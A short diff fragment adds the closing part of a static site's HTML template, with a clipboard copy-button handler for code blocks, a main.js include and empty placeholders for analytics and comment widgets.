+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
